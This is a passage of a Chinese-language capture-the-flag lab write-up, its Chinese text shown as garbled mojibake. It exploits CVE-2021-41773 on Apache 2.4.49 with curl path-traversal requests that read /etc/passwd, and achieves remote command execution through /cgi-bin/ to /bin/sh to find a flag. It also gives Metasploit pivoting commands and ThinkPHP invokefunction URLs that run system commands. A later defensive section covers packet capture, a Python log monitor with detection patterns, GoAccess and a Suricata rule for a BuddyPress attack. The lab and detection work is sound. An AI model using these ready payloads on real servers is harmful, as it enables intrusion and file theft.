   - Apacheç‰ˆæœ¬2.4.49**å®Œå…¨åŒ¹é…CVE-2021-41773çš„å—å½±å“ç‰ˆæœ¬**
   - æœåŠ¡å™¨é…ç½®æ ‡å‡†ï¼Œæœªå‘ç°ç‰¹æ®Šçš„å®‰å…¨åŠ å›º
2. **æ”»å‡»æ¡ä»¶æ»¡è¶³**:

   - **ç‰ˆæœ¬åŒ¹é…**: ç¡®è®¤ä¸ºæ˜“å—æ”»å‡»çš„Apacheç‰ˆæœ¬
   - **æœåŠ¡é…ç½®**: æ ‡å‡†Apacheé…ç½®ï¼Œä¸ºè·¯å¾„éå†æ”»å‡»æä¾›äº†æ¡ä»¶
3. **å®‰å…¨æ€åŠ¿è¯„ä¼°**:

   - **é«˜é£é™©**: ç‰ˆæœ¬å®Œå…¨åŒ¹é…å·²çŸ¥é«˜å±æ¼æ´
   - **é…ç½®è–„å¼±**: ç¼ºå°‘å¤šä¸ªå®‰å…¨å¤´ï¼Œä¿¡æ¯æ³„éœ²é£é™©
   - **æ”»å‡»é¢**: CGIåŠŸèƒ½å¯ç”¨ï¼Œä¸ºä»£ç æ‰§è¡Œæä¾›äº†å¯èƒ½

#### 3. æ¼æ´åˆ†æä¸åˆ©ç”¨

##### 3.1 CVE-2021-41773 æ¼æ´åŸç†

**æ¼æ´åŸºæœ¬ä¿¡æ¯**:

- **CVEç¼–å·**: CVE-2021-41773
- **CVSSè¯„åˆ†**: 7.5 (é«˜å±)
- **æ¼æ´ç±»å‹**: è·¯å¾„éå† (Path Traversal)
- **å½±å“ç‰ˆæœ¬**: Apache HTTP Server 2.4.49
- **æ¼æ´åŸç†**: Apache 2.4.49ç‰ˆæœ¬åœ¨å¤„ç†URLè·¯å¾„è§„èŒƒåŒ–æ—¶å­˜åœ¨ç¼ºé™·ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ ç‰¹æ®Šçš„URLç¼–ç ç»•è¿‡è·¯å¾„é™åˆ¶ï¼Œè®¿é—®Webæ ¹ç›®å½•ä¹‹å¤–çš„æ–‡ä»¶

**æŠ€æœ¯ç»†èŠ‚**:

- **æ ¹æœ¬åŸå› **: Apacheå¯¹URLä¸­çš„è·¯å¾„åˆ†éš”ç¬¦å’Œç‚¹å·åºåˆ—çš„å¤„ç†ä¸å½“
- **ç»•è¿‡æœºåˆ¶**: ä½¿ç”¨URLç¼–ç çš„ç‚¹å·(`%2e`)å¯ä»¥ç»•è¿‡è·¯å¾„è§„èŒƒåŒ–æ£€æŸ¥
- **æ”»å‡»è·¯å¾„**: é€šè¿‡Aliasæ˜ å°„çš„ç›®å½•(å¦‚ `/cgi-bin/`, `/icons/`)è¿›è¡Œè·¯å¾„éå†

##### 3.2 è·¯å¾„éå†æ”»å‡»å®è·µ

###### 3.2.1 åŸºç¡€è·¯å¾„éå†æµ‹è¯•

```bash
# å°è¯•é€šè¿‡CGIè·¯å¾„è¯»å– /etc/passwd æ–‡ä»¶
curl "http://10.37.133.3:42286/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"

# å°è¯•è¯»å– Apache é…ç½®æ–‡ä»¶
curl "http://10.37.133.3:42286/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/apache2/apache2.conf"

# å°è¯•è¯»å–å…¶ä»–æ•æ„Ÿæ–‡ä»¶
curl "http://10.37.133.3:42286/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shadow"
curl "http://10.37.133.3:42286/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/proc/version"
```

**æ‰§è¡Œç»“æœåˆ†æ**:
æ‰€æœ‰é€šè¿‡ `/cgi-bin/`è·¯å¾„çš„æ”»å‡»å°è¯•éƒ½è¿”å›äº† `500 Internal Server Error`ï¼Œè¿™è¡¨æ˜ï¼š

1. **CGIé…ç½®é—®é¢˜**: CGIæ¨¡å—å¯èƒ½æ²¡æœ‰æ­£ç¡®é…ç½®æˆ–ç¼ºå°‘å¿…è¦çš„CGIè„šæœ¬
2. **è·¯å¾„è§£æé—®é¢˜**: Apacheå¯èƒ½å¯¹CGIè·¯å¾„ä¸‹çš„è·¯å¾„éå†æœ‰ç‰¹æ®Šå¤„ç†
3. **æƒé™é™åˆ¶**: å¯èƒ½å­˜åœ¨é¢å¤–çš„è®¿é—®æ§åˆ¶æœºåˆ¶

###### 3.2.2 éCGIè·¯å¾„çš„ç›´æ¥éå†æ”»å‡»

CVE-2021-41773ä¸ä»…é™äºCGIè·¯å¾„ï¼Œæˆ‘ä»¬å°è¯•å…¶ä»–æ˜ å°„è·¯å¾„ï¼š

```bash
# å°è¯•é€šè¿‡iconsè·¯å¾„è¿›è¡Œéå†
curl "http://10.37.133.3:42286/icons/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"

# å°è¯•é€šè¿‡manualè·¯å¾„è¿›è¡Œéå†  
curl "http://10.37.133.3:42286/manual/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"

# ç›´æ¥æ ¹è·¯å¾„å°è¯•
curl "http://10.37.133.3:42286/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
```

**æ‰§è¡Œç»“æœ**:

```bash
â”Œâ”€â”€(kaliã‰¿kali-attacker)-[~/ctf-games/fofapro/vulfocus]
â””â”€$ curl "http://10.37.133.3:42286/icons/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
```

**æ”»å‡»ç»“æœåˆ†æ**:

1. âœ… **`/icons/` è·¯å¾„æ”»å‡»æˆåŠŸ**

   - **çŠ¶æ€**: ğŸ‰ å®Œå…¨æˆåŠŸ - è¯»å–åˆ°å®Œæ•´çš„ `/etc/passwd` æ–‡ä»¶
   - **ç¼–ç æ–¹å¼**: ä»…ä½¿ç”¨åŸºç¡€çš„å•å±‚URLç¼–ç  `%2e%2e`ï¼ˆä¸éœ€è¦åŒé‡ç¼–ç ï¼‰
   - **æŠ€æœ¯æ„ä¹‰**: è¯æ˜CVE-2021-41773ä¸ä»…é™äºCGIè·¯å¾„ï¼Œè¿˜å½±å“Apacheçš„é™æ€èµ„æºæ˜ å°„
2. ğŸš« **`/manual/` è·¯å¾„è¢«é˜»æ­¢**

   - **çŠ¶æ€**: 403 Forbidden
   - **åŸå› **: Manualæ–‡æ¡£è·¯å¾„å¯èƒ½æœ‰ç‰¹æ®Šçš„è®¿é—®æ§åˆ¶é…ç½®
   - **å®‰å…¨ç­–ç•¥**: è¡¨æ˜æŸäº›è·¯å¾„æ˜ å°„æœ‰é¢å¤–çš„å®‰å…¨é™åˆ¶
3. ğŸš« **ç›´æ¥æ ¹è·¯å¾„è¢«é˜»æ­¢**

   - **çŠ¶æ€**: 403 Forbidden
   - **åŸå› **: æ ¹è·¯å¾„çš„è·¯å¾„éå†è¢«Apacheçš„åŸºç¡€å®‰å…¨æœºåˆ¶é˜»æ­¢

##### 3.3 è¿œç¨‹ä»£ç æ‰§è¡Œ(RCE)æ”»å‡»

###### 3.3.1 CGIè·¯å¾„çš„RCEæ”»å‡»å°è¯•

```bash
# é€šè¿‡CGIè·¯å¾„æ‰§è¡Œshellå‘½ä»¤
curl "http://10.37.133.3:42286/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" -d "echo Content-Type: text/plain; echo; id"
```

**RCEæ”»å‡»ç»“æœ**:

```bash
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**ğŸ‰ RCEæ”»å‡»æˆåŠŸï¼**

- **æƒé™è·å–**: æˆåŠŸä»¥ `www-data`ç”¨æˆ·èº«ä»½æ‰§è¡Œå‘½ä»¤
- **æ”»å‡»æ–¹å¼**: é€šè¿‡CGIè·¯å¾„ç»“åˆè·¯å¾„éå†ï¼Œç›´æ¥è°ƒç”¨ç³»ç»Ÿshell
- **ç¼–ç æŠ€æœ¯**: ä½¿ç”¨æ··åˆç¼–ç  `.%2e`ç»•è¿‡è·¯å¾„é™åˆ¶

###### 3.3.2 ç³»ç»Ÿä¿¡æ¯æ”¶é›†

```bash
# è·å–ç³»ç»Ÿä¿¡æ¯
curl "http://10.37.133.3:42286/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" -d "echo Content-Type: text/plain; echo; uname -a"

# æŸ¥çœ‹å½“å‰ç›®å½•
curl "http://10.37.133.3:42286/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" -d "echo Content-Type: text/plain; echo; pwd"

# åˆ—å‡ºæ ¹ç›®å½•å†…å®¹
curl "http://10.37.133.3:42286/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" -d "echo Content-Type: text/plain; echo; ls -la /"
```

##### 3.4 Flagæ–‡ä»¶æœç´¢ä¸è·å–

###### 3.4.1 ç³»ç»Ÿæ–‡ä»¶æœç´¢

```bash
# æœç´¢ç³»ç»Ÿä¸­æ‰€æœ‰åŒ…å«flagçš„æ–‡ä»¶
curl "http://10.37.133.3:42286/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" -d "echo Content-Type: text/plain; echo; find / -name '*flag*' 2>/dev/null"
```

**æœç´¢ç»“æœ**:

```bash
/sys/devices/platform/serial8250/serial8250:0/serial8250:0.3/tty/ttyS3/flags
/sys/devices/platform/serial8250/serial8250:0/serial8250:0.1/tty/ttyS1/flags
/sys/devices/platform/serial8250/serial8250:0/serial8250:0.2/tty/ttyS2/flags
/sys/devices/platform/serial8250/serial8250:0/serial8250:0.0/tty/ttyS0/flags
/sys/devices/virtual/net/lo/flags
/sys/devices/virtual/net/eth0/flags
/sys/module/scsi_mod/parameters/default_dev_flags
/tmp/flag-{bmha8de6a45-2ae2-4615-97ff-1af1edd5afcf}
/proc/sys/net/ipv4/fib_notify_on_flag_change
/proc/sys/net/ipv6/fib_notify_on_flag_change
/proc/kpageflags
/usr/lib/x86_64-linux-gnu/perl/5.32.1/bits/ss_flags.ph
/usr/lib/x86_64-linux-gnu/perl/5.32.1/bits/waitflags.ph
```

**ğŸ¯ æ‰¾åˆ°äº†ï¼flagæ–‡ä»¶åœ¨ `/tmp/flag-{bmha8de6a45-2ae2-4615-97ff-1af1edd5afcf}`**

###### 3.4.2 Flagå†…å®¹è¯»å–

```bash
# è¯»å–flagæ–‡ä»¶å†…å®¹
curl "http://10.37.133.3:42286/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" -d "echo Content-Type: text/plain; echo; cat /tmp/flag-{bmha8de6a45-2ae2-4615-97ff-1af1edd5afcf}"
```

**Flagè·å–æˆåŠŸ**: `flag-{bmha8de6a45-2ae2-4615-97ff-1af1edd5afcf}`

### æ­¥éª¤å…­ å‘ç°ç»ˆç‚¹é¶æ ‡

åŒæ ·ï¼Œip aæŸ¥çœ‹ç¬¬äºŒå±‚é¶æœºçš„ç½‘å¡ï¼Œå‘ç°åŒç½‘å¡
![](./pics/å‘ç°åŒç½‘å¡.png)
å‡çº§shell
`sessions -u <>`
è¿›å…¥æ–°å¯åŠ¨çš„shell
`sessions -i <>`
è®¾ç½®pivotè·¯ç”±
`run autoroute -s 10,10,10,0/24`
![](./pics/è®¾ç½®pivotè·¯ç”±.png)<br>
![](./pics/è®¾ç½®pivotè·¯ç”±æˆåŠŸ.png)<br>
æ‰«æå‘ç°ç»ˆç‚¹é¶æ ‡
![](./pics/å‘ç°ç»ˆç‚¹é¶æ ‡.png)<br>

### æ­¥éª¤å…­ æ”»å‡»ç»ˆç‚¹é¶æ ‡

#### thinkphp

cve_2018_1002015
1. æµè§ˆå™¨è®¿é—®ä»¥ä¸‹ç½‘é¡µ
![](./pics/è®¿é—®thinkphp.png)

2. æµè§ˆå™¨è®¿é—®ä»¥ä¸‹ç½‘é¡µï¼Œæ‰§è¡Œphpinfo()
`http://<ç›®æ ‡IP>:<ç«¯å£>/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars%5B0%5D=phpinfo&vars%5B1%5D%5B%5D=1`
![](./pics/phpinfo.png)<br>
3. æ‰§è¡Œç³»ç»Ÿå‘½ä»¤`ls /tmp`

`http://<ç›®æ ‡IP>:<ç«¯å£>/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars%5B0%5D=system&vars%5B1%5D%5B%5D=ls%20/tmp`
![](./pics/ç¬¬ä¸‰ä¸ªflag.png)<br>


# æ¼æ´åˆ©ç”¨æ£€æµ‹
## å…¥å£é¶æ ‡åˆ©ç”¨æ£€æµ‹
#### æ‰‹åŠ¨æ£€æµ‹
1. **wiresharkæŠ“åŒ…**
   æˆ‘ä»¬å¯ä»¥åˆ©ç”¨wiresharkæŠ“åŒ…æ¥æŸ¥çœ‹æ”»å‡»è¡Œä¸ºã€‚
   ```bash
   sudo tcpdump -i eth1 -w capture.pcap port 18813
   ```
   ![1747914135600](image/readme/1747914135600.png)
   æ‰“å¼€``wireshark``å¹¶åˆ†æ : 
   ![1747914180373](image/readme/1747914180373.png)
   **è¿‡æ»¤http , åˆ†æå…¶ä¸­ä¸€ä¸ªåŒ… , å³é”®follow ->http stream**
   ![1748236380067](image/readme/1748236380067.png)
   ![1748236450360](image/readme/1748236450360.png)
   é’ˆå¯¹WordPressç«™ç‚¹BuddyPressæ’ä»¶çš„APIè¯·æ±‚ï¼š

   ```
   PUT /wp-json/buddypress/v1/signup/activate/v6EeK8XWihRsxXvXAWPMVzSTO2gs7WdF HTTP/1.1
   ```

   - **æ–¹æ³•**: PUT 
   - **ç«¯ç‚¹**: `/wp-json/buddypress/v1/signup/activate/v6EeK8XWihRsxXvXAWPMVzSTO2gs7WdF`
   - BuddyPressçš„REST APIç«¯ç‚¹
   - å°è¯•æ¿€æ´»ä¸€ä¸ªç”¨æˆ·æ³¨å†Œ(v6EeK8XWihRsxXvXAWPMVzSTO2gs7WdFæ˜¯æ¿€æ´»å¯†é’¥)
   - **è¯·æ±‚ä½“**: 
      ```json
      {
         "user_login": "attacker2",
         "user_email": "attacker2@163.com",
         "user_name": "attacker2",
         "password": "attacker2"
      }
      ```
      - å°è¯•åˆ›å»º/æ¿€æ´»ç”¨æˆ·"attacker2"
   - **çŠ¶æ€ç **: 404 Not Found
      ```
      HTTP/1.1 404 Not Found
      ```
   - **å“åº”ä½“**:
      ```json
      {
         "code": "bp_rest_invalid_activation_key",
         "message": "Invalid activation key.",
         "data": {
            "status": 404
         }
      }
      ```

   1. **æ”»å‡»è¡Œä¸º**:
      - å°è¯•é€šè¿‡BuddyPress APIåˆ›å»º/æ¿€æ´»ç”¨æˆ·è´¦æˆ·

   2. **å›æ˜¾**:
      - æœåŠ¡å™¨è¿”å›404å’Œ"Invalid activation key"
      - è¡¨æ˜æä¾›çš„æ¿€æ´»å¯†é’¥æ— æ•ˆæˆ–å·²è¿‡æœŸ

---

#### è‡ªåŠ¨åŒ–æ£€æµ‹
**[ æ–¹æ³•ä¸€ ]**
1. **ç›‘å¬æ—¥å¿—**
   è¿›å…¥wordpresså®¹å™¨ä¸­æŸ¥çœ‹å¯åŠ¨æ–‡ä»¶``start.sh`` , æˆ‘ä»¬å¯ä»¥çœ‹åˆ° `/etc/init.d/mysql restart` å’Œ `/etc/init.d/apache2 restart` è¿™ä¸¤ä¸ªå‘½ä»¤ï¼Œè¿™è¯´æ˜å®¹å™¨çš„æ—¥å¿—å¾ˆæœ‰å¯èƒ½å†™å…¥äº† `/var/log/apache2/access.log` æ–‡ä»¶ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å®æ—¶ç›‘å¬è¿™ä¸ªæ–‡ä»¶ï¼Œå¹¶æŸ¥çœ‹æ³¨å†Œæˆ–æƒé™æå‡çš„å°è¯•è¡Œä¸ºã€‚
   ```bash
   root@3efe65610f5a:/# 
   cat start.sh
   #!/bin/bash
   /etc/init.d/mysql restart
   /etc/init.d/apache2 restart

   /usr/bin/tail -f /dev/null
   ```

   æˆ‘ä»¬çš„ç›‘å¬pythonä»£ç å¦‚ä¸‹ï¼š
   ```python
   import time
   import re

   def monitor_access_log(log_path):
      print("[*] æ­£åœ¨å®æ—¶ç›‘æ§æ—¥å¿—æ–‡ä»¶: {}".format(log_path))

      try:
         with open(log_path, 'r') as f:
               f.seek(0, 2)  # ç§»åŠ¨åˆ°æ–‡ä»¶æœ«å°¾ï¼Œç›‘å¬æ–°å¢å†…å®¹

               while True:
                  line = f.readline()
                  if not line:
                     time.sleep(0.5)
                     continue

                  # ç¤ºä¾‹æ”»å‡»è¡Œä¸ºè§„åˆ™ï¼šä½ å¯ä»¥ç»§ç»­åŠ è§„åˆ™
                  if re.search(r'PUT\s+/wp-json/buddypress/v1/signup/activate/', line):
                     print("[!!!] æƒé™æå‡å°è¯•æ£€æµ‹åˆ°: {}".format(line.strip()))

                  elif re.search(r'POST\s+/wp-json/buddypress/v1/signup', line):
                     print("[!!!] æ³¨å†Œæ”»å‡»è¡Œä¸ºæ£€æµ‹åˆ°: {}".format(line.strip()))

                  elif re.search(r'/wp-admin', line) and 'wp-login.php' not in line:
                     print("[*] åå°è®¿é—®è¡Œä¸ºæ£€æµ‹åˆ°: {}".format(line.strip()))

      except Exception as e:
         print("[!] é”™è¯¯: {}".format(e))

   if __name__ == "__main__":
      monitor_access_log("/var/log/apache2/access.log")
   ```
   - å½“æ”»å‡»è€…æ³¨å†Œæ—¶
   ![1747911181136](image/readme/1747911181136.png)
   - å½“æ”»å‡»è€…æ¿€æ´»æ—¶
   ![1747911640431](image/readme/1747911640431.png)
   å¯ä»¥å‘ç°å‡ç›‘å¬åˆ°äº†ç›¸åº”çš„æ”»å‡»è¡Œä¸ºã€‚

---

**[ æ–¹æ³•äºŒ ]**

2. **goaccess æ—¥å¿—åˆ†æå·¥å…·**

GoAccess æ˜¯ä¸€ä¸ªå¼€æºçš„å®æ—¶æ—¥å¿—åˆ†æå·¥å…·ï¼Œä¸“é—¨ç”¨äºåˆ†æ Web æœåŠ¡å™¨æ—¥å¿—æ–‡ä»¶ã€‚å®ƒèƒ½å¤Ÿå¿«é€Ÿè§£æ Apacheã€Nginx ç­‰å¸¸è§ Web æœåŠ¡å™¨ç”Ÿæˆçš„æ—¥å¿—ï¼Œå¹¶æä¾›ç›´è§‚çš„å¯è§†åŒ–ç»Ÿè®¡ä¿¡æ¯ï¼Œå¸®åŠ©å®‰å…¨äººå‘˜å’Œè¿ç»´äººå‘˜å¿«é€Ÿå‘ç°å¼‚å¸¸è¡Œä¸ºæˆ–æ½œåœ¨æ”»å‡»ã€‚
- ä¸ºäº†ä½¿ç”¨ GoAccess è¿›è¡Œæ—¥å¿—åˆ†æï¼Œé¦–å…ˆéœ€è¦å®‰è£…å®ƒï¼š
   ```bash
   root@3efe65610f5a:/# 
   apt update && apt install goaccess
   ```
   ![1747912555913](image/readme/1747912555913.png)
- æ¥ä¸‹æ¥æˆ‘ä»¬ä½¿ç”¨ GoAccess å¯¹ `/var/log/apache2/access.log` æ–‡ä»¶è¿›è¡Œåˆ†æï¼š
   ```bash
   root@3efe65610f5a:/# 
   goaccess -f /var/log/apache2/access.log \
   -c \
   --log-format='%h %^[%d:%t %^] "%r" %s %b "%R" "%u"' \
   --date-format=%d/%b/%Y \
   --time-format=%H:%M:%S
   ```
   | å‚æ•° | è¯´æ˜ |
   |------|------|
   | `-f /var/log/apache2/access.log` | æŒ‡å®šè¦åˆ†æçš„æ—¥å¿—æ–‡ä»¶è·¯å¾„ã€‚`access.log` æ˜¯ Apache é»˜è®¤è®°å½•è®¿é—®è¯·æ±‚çš„æ—¥å¿—æ–‡ä»¶ã€‚ |
   | `-c` | è¿›å…¥äº¤äº’å¼é…ç½®ç•Œé¢ï¼Œç”¨æˆ·å¯ä»¥åœ¨å…¶ä¸­é€‰æ‹©éœ€è¦å¯ç”¨çš„æ¨¡å—ï¼ˆå¦‚ IP åœ°ç†ä½ç½®æŸ¥è¯¢ã€æ˜¯å¦æ˜¾ç¤ºå›¾è¡¨ç­‰ï¼‰ã€‚ |
   | `--log-format=...` | è‡ªå®šä¹‰æ—¥å¿—æ ¼å¼ï¼Œå¿…é¡»ä¸ `access.log` çš„å®é™…æ ¼å¼åŒ¹é…ï¼Œå¦åˆ™æ— æ³•æ­£ç¡®è§£æã€‚ |
   | `--date-format=%d/%b/%Y` | è®¾ç½®æ—¥æœŸæ ¼å¼ä¸ºæ—¥/æœˆ/å¹´ï¼ˆä¾‹å¦‚ï¼š10/Apr/2025ï¼‰ |
   | `--time-format=%H:%M:%S` | è®¾ç½®æ—¶é—´æ ¼å¼ä¸ºå°æ—¶:åˆ†é’Ÿ:ç§’ |


- GoAccess éœ€è¦é€šè¿‡ `--log-format` å‘ŠçŸ¥å…¶å¦‚ä½•è§£ææ—¥å¿—å†…å®¹ã€‚ä»¥ä¸‹æ˜¯ä¸€ä¸ªå…¸å‹çš„ Apache `access.log` æ¡ç›®ç¤ºä¾‹ï¼š

   ```
   192.168.1.100 - - [10/Apr/2025:14:23:17 +0000] "GET /index.php HTTP/1.1" 200 3456 "-" "Mozilla/5.0"
   ```

   å¯¹åº”çš„ `--log-format` è§£é‡Šå¦‚ä¸‹ï¼š

   ```
   %h %^[%d:%t %^] "%r" %s %b "%R" "%u"
   ```

   | æ ¼å¼ç¬¦å· | å«ä¹‰ |
   |----------|------|
   | `%h` | å®¢æˆ·ç«¯ IP åœ°å€ï¼ˆhostï¼‰ |
   | `%^[` | å¿½ç•¥å·¦æ–¹æ‹¬å· `[` |
   | `%d` | æ—¥æœŸï¼ˆday/month/yearï¼‰ |
   | `%t` | æ—¶é—´ï¼ˆhour:minute:secondï¼‰ |
   | `%r` | è¯·æ±‚è¡Œï¼ˆmethod + path + protocolï¼‰ |
   | `%s` | å“åº”çŠ¶æ€ç ï¼ˆå¦‚ 200, 404ï¼‰ |
   | `%b` | å“åº”ä½“å¤§å°ï¼ˆbytesï¼‰ |
   | `%R` | Referer å¤´ï¼ˆå³è¯·æ±‚æ¥æºé¡µé¢ï¼‰ |
   | `%u` | User-Agentï¼ˆå®¢æˆ·ç«¯æµè§ˆå™¨ä¿¡æ¯ï¼‰ |

   > âš ï¸ æ³¨æ„ï¼šå¦‚æœä½ çš„æ—¥å¿—æ ¼å¼ä¸åŒï¼Œæ¯”å¦‚åŒ…å«é¢å¤–å­—æ®µï¼ˆå¦‚è¯·æ±‚è€—æ—¶ã€cookie ç­‰ï¼‰ï¼Œä½ éœ€è¦ç›¸åº”åœ°ä¿®æ”¹ `--log-format` å­—ç¬¦ä¸²ï¼Œå¦åˆ™ä¼šå¯¼è‡´è§£æå¤±è´¥ã€‚


   æ‰§è¡Œä¸Šè¿°å‘½ä»¤åï¼ŒGoAccess ä¼šè¿›å…¥ç»ˆç«¯ç•Œé¢å¹¶å±•ç¤ºä»¥ä¸‹å…³é”®æŒ‡æ ‡ï¼š

   1. **æ€»ä½“è¯·æ±‚ç»Ÿè®¡**
      - æ€»è¯·æ±‚æ•°ã€æœ‰æ•ˆè¯·æ±‚æ•°ã€æ— æ•ˆè¯·æ±‚ï¼ˆå¦‚æ ¼å¼é”™è¯¯ï¼‰æ•°ã€‚
      - æˆåŠŸå“åº”ï¼ˆ2xxï¼‰ã€é‡å®šå‘ï¼ˆ3xxï¼‰ã€å®¢æˆ·ç«¯é”™è¯¯ï¼ˆ4xxï¼‰ã€æœåŠ¡ç«¯é”™è¯¯ï¼ˆ5xxï¼‰å æ¯”ã€‚

   2. **è®¿å®¢ IP ç»Ÿè®¡**
      - æ˜¾ç¤ºæ¯ä¸ª IP çš„è¯·æ±‚æ¬¡æ•°ï¼Œå¯ç”¨äºè¯†åˆ«å¼‚å¸¸é«˜é¢‘è®¿é—®è€…ï¼ˆå¦‚çˆ¬è™«æˆ–æ”»å‡»è€…ï¼‰ã€‚

   3. **è¯·æ±‚ URL æ’å**
      - å±•ç¤ºæœ€å¸¸è®¿é—®çš„ URLï¼Œæœ‰åŠ©äºè¯†åˆ«çƒ­é—¨èµ„æºæˆ–æ½œåœ¨æ”»å‡»å…¥å£ï¼ˆå¦‚ `/wp-json/buddypress/v1/signup`ï¼‰ã€‚

   4. **HTTP çŠ¶æ€ç åˆ†å¸ƒ**
      - è¯†åˆ«å¤§é‡ 404 æˆ– 403 è¯·æ±‚ï¼Œå¯èƒ½è¡¨ç¤ºæ‰«æè¡Œä¸ºæˆ–å°è¯•æ¼æ´åˆ©ç”¨ã€‚

   5. **User-Agent åˆ†å¸ƒ**
      - æŸ¥çœ‹è®¿é—®è€…çš„æµè§ˆå™¨ç±»å‹ï¼Œè¯†åˆ«éæ­£å¸¸è®¿é—®ï¼ˆå¦‚è„šæœ¬æˆ–è‡ªåŠ¨åŒ–å·¥å…·å‘èµ·çš„è¯·æ±‚ï¼‰ã€‚

   6. **æ—¶é—´è¶‹åŠ¿å›¾**
      - å±•ç¤ºæ¯å°æ—¶/æ¯å¤©çš„è®¿é—®é‡å˜åŒ–ï¼Œå¸®åŠ©è¯†åˆ«çªå‘æµé‡æˆ– DDoS æ”»å‡»ã€‚



   åœ¨æœ¬æ¬¡å®éªŒä¸­ï¼ŒGoAccess å¯ä»¥ç”¨æ¥ç›‘æ§ WordPress æ¼æ´æ”»å‡»è¡Œä¸ºï¼Œä¾‹å¦‚ï¼š

   - âœ… **æ£€æµ‹æ³¨å†Œç»•è¿‡æ”»å‡»**ï¼šé€šè¿‡æŸ¥çœ‹ `/wp-json/buddypress/v1/signup` æ¥å£çš„è®¿é—®é¢‘ç‡ã€‚
   - âœ… **è¯†åˆ«ææƒå°è¯•**ï¼šæ£€æŸ¥æ˜¯å¦æœ‰å¤§é‡å¯¹ `/wp-json/buddypress/v1/members/me` çš„ POST è¯·æ±‚ã€‚
   - âœ… **è¿½è¸ªæ¶æ„ä¸Šä¼ è¡Œä¸º**ï¼šæŸ¥æ‰¾ `/wp-admin/media-new.php` æˆ– `/wp-content/uploads/` ç›¸å…³è¯·æ±‚ã€‚
   ![1747912486912](image/readme/1747912486912.png)

---

**[ æ–¹æ³•ä¸‰ ]**

3. **suricataæ£€æµ‹**
   Suricata æ˜¯ä¸€ä¸ªé«˜æ€§èƒ½çš„å¼€æºç½‘ç»œ IDSï¼ˆå…¥ä¾µæ£€æµ‹ç³»ç»Ÿï¼‰ã€IPSï¼ˆå…¥ä¾µé˜²å¾¡ç³»ç»Ÿï¼‰å’Œç½‘ç»œå®‰å…¨ç›‘æ§å¼•æ“ã€‚å®ƒèƒ½å¤Ÿå®æ—¶åˆ†æç½‘ç»œæµé‡ï¼Œæ£€æµ‹æ¶æ„è¡Œä¸ºï¼Œå¹¶é€šè¿‡è§„åˆ™åŒ¹é…è¯†åˆ«æ”»å‡»æ¨¡å¼ã€‚

   **1. å®‰è£…å¯åŠ¨ Suricata**
   ```bash
   docker run -d --name suricata --net=host -e SURICATA_OPTIONS="-i eth1" jasonish/suricata:6.0.4
   ```
   - `suricata` åŒ…å«äº†æ ¸å¿ƒå¼•æ“å’Œé»˜è®¤è§„åˆ™é›†ã€‚
   - å®‰è£…å®Œæˆåï¼Œé»˜è®¤é…ç½®æ–‡ä»¶ä½äº `/etc/suricata/suricata.yaml`ã€‚
   **2. ç¼–è¾‘ Suricata é…ç½®æ–‡ä»¶**
      - é¦–å…ˆè¿›å…¥å®¹å™¨å†…éƒ¨
      ```bash
      docker exec -it suricata bash
      ```
      - åˆ›å»ºä¸€ä¸ªè‡ªå®šä¹‰è§„åˆ™æ–‡ä»¶ , å†™å…¥ï¼š
      ```bash 
      echo '
      alert http $EXTERNAL_NET any -> $HOME_NET any (
         msg:"CVE-2021-21389: BuddyPress ææƒå°è¯•";
         flow:to_server,established;
         content:"POST"; http_method;
         content:"/wp-json/buddypress/v1/members/me"; http_uri;
         content:"roles"; http_client_body; fast_pattern;
         content:"administrator"; http_client_body;
         sid:1000001;
         rev:1;
         classtype:web-application-attack;
         )' > /etc/suricata/rules/cve-2021-21389.rules
      ```
      - åŠ è½½è‡ªå®šä¹‰è§„åˆ™
      ```bash
      sudo vim /etc/suricata/suricata.yaml
      ```
      åœ¨ ``rule-files:`` ä¸‹æ·»åŠ ä¸€è¡Œï¼š
      ```bash
       - cve-2021-21389.rules
      ```
      ##### **è§„åˆ™è§£é‡Šï¼š**

      | å­—æ®µ | è¯´æ˜ |
      |------|------|
      | `alert http` | è¡¨ç¤ºè¿™æ˜¯ä¸€ä¸ª HTTP åè®®çš„å‘Šè­¦è§„åˆ™ |
      | `$EXTERNAL_NET any -> $HOME_NET any` | è¡¨ç¤ºä»å¤–éƒ¨ç½‘ç»œå‘èµ·è¯·æ±‚åˆ°å†…éƒ¨ç½‘ç»œä¸»æœºçš„ä»»æ„ç«¯å£ |
